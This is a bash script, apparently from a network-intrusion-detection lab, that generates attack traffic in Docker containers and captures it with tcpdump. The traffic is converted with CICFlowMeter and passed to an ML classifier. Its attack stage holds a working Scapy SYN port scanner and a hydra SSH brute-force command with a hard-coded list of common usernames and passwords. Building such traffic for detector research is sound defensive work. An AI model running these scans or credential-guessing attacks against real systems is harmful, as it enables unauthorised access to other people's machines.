#!/bin/bash
# pipeline5.sh - SSH Brute Force 탐지 파이프라인 (탐지 성공)
# PortScan(SYN) + SSH Brute Force(hydra)
# → tcpdump → CICFlowMeter → ML 예측

set -e

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
OUTPUT="$SCRIPT_DIR/../cicflow_output.csv"

echo "========================================"
echo "[1/5] tcpdump 시작"
echo "========================================"
docker exec suricata bash -c "rm -f /tmp/attack5.pcap; tcpdump -i eth0 -w /tmp/attack5.pcap -q &>/dev/null &"
sleep 2
echo "  캡처 시작됨"

echo ""
echo "========================================"
echo "[2/5] 공격 실행"
echo "========================================"

echo "  [A] PortScan: SYN scan ports 1-1024 (Scapy)..."
docker exec attacker python3 - << 'PYEOF'
from scapy.all import sendp, Ether, IP, TCP, ARP, srp, conf, get_if_hwaddr, get_if_addr
import random
conf.verb = 0
TARGET = "172.20.0.10"
IFACE  = "eth0"
src_mac = get_if_hwaddr(IFACE)
src_ip  = get_if_addr(IFACE)
ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=TARGET), iface=IFACE, timeout=2, verbose=0)
dst_mac = ans[0][1].hwsrc if ans else "ff:ff:ff:ff:ff:ff"
sport = random.randint(2000, 9000)
pkts = [Ether(src=src_mac, dst=dst_mac)/IP(src=src_ip, dst=TARGET)/TCP(sport=sport, dport=p, flags="S")
        for p in range(1, 1025)]
sendp(pkts, iface=IFACE)
print(f"  SYN scan: {len(pkts)} packets sent")
PYEOF
echo "  PortScan 완료"
sleep 2

echo "  [B] SSH Brute Force: hydra → port 22..."
docker exec attacker bash -c "printf 'password\n123456\nadmin\nroot\nletmein\nqwerty\nabc123\nmonkey\nmaster\ndragon\npass123\nwelcome\nlogin123\ntest123\ndebian\nlinux\nubuntu\nserver\nsecret\nhello\n' > /tmp/ssh_pass.txt"
docker exec attacker bash -c "printf 'root\nadmin\nuser\ntest\nubuntu\ndebian\n' > /tmp/ssh_users.txt"
docker exec attacker bash -c "hydra -L /tmp/ssh_users.txt -P /tmp/ssh_pass.txt -t 6 -e nsr ssh://172.20.0.10 2>&1 | tail -10" || true
echo "  SSH Brute Force 완료"

echo ""
echo "========================================"
echo "[3/5] tcpdump 중지 + pcap 추출"
echo "========================================"
docker exec suricata bash -c "pkill tcpdump; sleep 2"
docker exec suricata cat /tmp/attack5.pcap > /tmp/attack5_local.pcap
ls -lh /tmp/attack5_local.pcap

echo ""
echo "========================================"
echo "[4/5] CICFlowMeter 변환"
echo "========================================"
cicflowmeter -f /tmp/attack5_local.pcap -c /tmp/cicflow_attack5.csv
echo "  변환 완료"

echo ""
echo "========================================"
echo "[5/5] 복사 + ML 예측"
echo "========================================"
cp /tmp/cicflow_attack5.csv "$OUTPUT"
echo "  cicflow CSV → $OUTPUT"
echo ""
echo "  Windows에서 ML 예측 실행:"
echo "  python ml/predict_cicflow.py"
